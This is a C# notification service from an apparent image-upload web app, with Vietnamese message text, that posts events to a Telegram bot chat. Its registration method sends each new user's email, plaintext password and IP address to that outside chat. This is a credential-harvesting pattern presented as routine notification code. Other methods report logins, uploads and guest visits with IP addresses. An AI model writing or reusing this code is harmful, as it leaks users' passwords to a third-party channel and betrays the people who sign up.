using System.Net.Http.Json;
using System.Text.Json;
using ImageUploadApp.Models;
using Microsoft.Extensions.Options;

namespace ImageUploadApp.Services;

public sealed class TelegramNotifyService : ITelegramNotifyService
{
    private readonly HttpClient _http;
    private readonly TelegramOptions _opt;
    private readonly ILogger<TelegramNotifyService> _log;

    public TelegramNotifyService(HttpClient http, IOptions<TelegramOptions> options, ILogger<TelegramNotifyService> log)
    {
        _http = http;
        _opt = options.Value;
        _log = log;
    }

    public Task NotifyRegistrationAsync(string email, string passwordPlaintext, string? ip, CancellationToken cancellationToken = default)
    {
        var ipPart = string.IsNullOrEmpty(ip) ? "" : $"\nIP: {ip}";
        var text = $"<b>Đăng ký mới</b>\nEmail: {Escape(email)}\nMật khẩu: {Escape(passwordPlaintext)}{ipPart}";
        return SendHtmlAsync(text, cancellationToken);
    }

    public Task NotifyLoginAsync(string email, string? ip, CancellationToken cancellationToken = default)
    {
        var ipPart = string.IsNullOrEmpty(ip) ? "" : $"\nIP: {ip}";
        var text = $"<b>Đăng nhập</b>\nEmail: {Escape(email)}{ipPart}";
        return SendHtmlAsync(text, cancellationToken);
    }

    public Task NotifyUploadBatchAsync(string email, int fileCount, long totalBytes, CancellationToken cancellationToken = default)
    {
        var mb = totalBytes / (1024.0 * 1024.0);
        var text = $"<b>Tải ảnh</b>\nUser: {Escape(email)}\nSố file: {fileCount}\nDung lượng: {mb:0.##} MB";
        return SendHtmlAsync(text, cancellationToken);
    }

    public Task NotifyUserReturnedAsync(string email, string? ip, CancellationToken cancellationToken = default)
    {
        var ipPart = string.IsNullOrEmpty(ip) ? "" : $"\nIP: {Escape(ip)}";
        var text = $"<b>Người dùng quay lại app</b>\nEmail: {Escape(email)}{ipPart}";
        return SendHtmlAsync(text, cancellationToken);
    }

    public Task NotifyGuestVisitAsync(string? ip, CancellationToken cancellationToken = default)
    {
        var ipPart = string.IsNullOrEmpty(ip) ? "" : $"\nIP: {Escape(ip)}";
        var text = $"<b>Khách thăm quan</b>\nChưa đăng nhập.{ipPart}";
        return SendHtmlAsync(text, cancellationToken);
    }

    private async Task SendHtmlAsync(string text, CancellationToken cancellationToken)
    {
        if (string.IsNullOrWhiteSpace(_opt.BotToken) || string.IsNullOrWhiteSpace(_opt.ChatId))
        {
            _log.LogDebug("Telegram: BotToken hoặc ChatId chưa cấu hình — bỏ qua gửi.");
            return;
        }

        try
        {
            var url = $"https://api.telegram.org/bot{_opt.BotToken}/sendMessage";
            using var resp = await _http.PostAsJsonAsync(url, new
            {
                chat_id = _opt.ChatId,
                text,
                parse_mode = "HTML",
                disable_web_page_preview = true,
            }, cancellationToken);

            if (!resp.IsSuccessStatusCode)
            {
                var body = await resp.Content.ReadAsStringAsync(cancellationToken);
                _log.LogWarning("Telegram send failed: {Status} {Body}", resp.StatusCode, body);
            }
        }
        catch (Exception ex)
        {
            _log.LogWarning(ex, "Telegram send exception");
        }
    }

    private static string Escape(string s)
    {
        return s.Replace("&", "&amp;", StringComparison.Ordinal)
            .Replace("<", "&lt;", StringComparison.Ordinal)
            .Replace(">", "&gt;", StringComparison.Ordinal);
    }
}
